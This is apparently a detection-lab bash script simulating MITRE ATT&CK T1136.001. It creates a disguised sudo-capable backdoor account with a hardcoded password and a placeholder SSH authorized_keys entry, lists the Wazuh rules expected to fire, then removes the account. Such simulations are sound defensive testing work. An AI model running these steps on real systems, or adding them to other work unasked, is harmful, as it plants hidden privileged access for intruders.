#!/usr/bin/env bash
# =============================================================================
# T1136_create_account.sh — Create Account: Local Account (T1136.001)
# MITRE ATT&CK: https://attack.mitre.org/techniques/T1136/001/
#
# SIMULATION:
#   Creates a backdoor local account with sudo privileges, simulating
#   attacker persistence via account creation.
#
# EXPECTED DETECTIONS:
#   - Wazuh Rule 100030 (level 10): useradd invoked
#   - Wazuh Rule 100031 (level 15): usermod adding to sudo group
#   - Wazuh built-in: /etc/passwd modification (FIM)
#   - Wazuh built-in: /etc/shadow modification (FIM)
# =============================================================================

set -euo pipefail

BACKDOOR_USER="svc_backup_$(date +%s | tail -c4)"  # randomized to avoid conflicts
BACKDOOR_COMMENT="Service Account - Backup Daemon"

echo "[T1136.001] Simulating local account creation for persistence..."
echo "[T1136.001]   Backdoor username: ${BACKDOOR_USER}"

# ── Step 1: Create the account ────────────────────────────────────────────────
echo "[T1136.001] Step 1: useradd (Sysmon EventID 1 image=useradd)"
useradd \
  --comment "${BACKDOOR_COMMENT}" \
  --shell /bin/bash \
  --create-home \
  "${BACKDOOR_USER}"
echo "[T1136.001] ✓ Account created: ${BACKDOOR_USER}"

sleep 1

# ── Step 2: Add to sudo group ─────────────────────────────────────────────────
echo "[T1136.001] Step 2: usermod -aG sudo (Sysmon EventID 1 image=usermod, cmdline=sudo)"
usermod -aG sudo "${BACKDOOR_USER}"
echo "[T1136.001] ✓ Account added to sudo group"

sleep 1

# ── Step 3: Set weak password (simulates attacker maintaining access) ─────────
echo "[T1136.001] Step 3: Setting account password"
echo "${BACKDOOR_USER}:Lab@Simulation2024!" | chpasswd
echo "[T1136.001] ✓ Password set"

sleep 1

# ── Step 4: Add SSH backdoor (simulates authorized_keys persistence) ──────────
echo "[T1136.001] Step 4: Creating .ssh/authorized_keys (Sysmon EventID 11)"
BACKDOOR_HOME="/home/${BACKDOOR_USER}"
mkdir -p "${BACKDOOR_HOME}/.ssh"
# Write a dummy key (not real — random bytes formatted as a key comment)
echo "ssh-rsa SIMULATION_KEY_NOT_REAL DetectionLab-T1136-sim" \
  > "${BACKDOOR_HOME}/.ssh/authorized_keys"
chmod 600 "${BACKDOOR_HOME}/.ssh/authorized_keys"
chown -R "${BACKDOOR_USER}:${BACKDOOR_USER}" "${BACKDOOR_HOME}/.ssh"
echo "[T1136.001] ✓ Fake SSH authorized_keys written"

# ── Verify ────────────────────────────────────────────────────────────────────
echo "[T1136.001] Verification: account exists with sudo"
id "${BACKDOOR_USER}" || true

# ── Cleanup ───────────────────────────────────────────────────────────────────
sleep 3
echo "[T1136.001] Cleanup: removing simulation account ${BACKDOOR_USER}"
userdel --remove "${BACKDOOR_USER}" 2>/dev/null || true
groupdel "${BACKDOOR_USER}" 2>/dev/null || true

echo "[T1136.001] Simulation complete. Check Wazuh for rules 100030 / 100031."
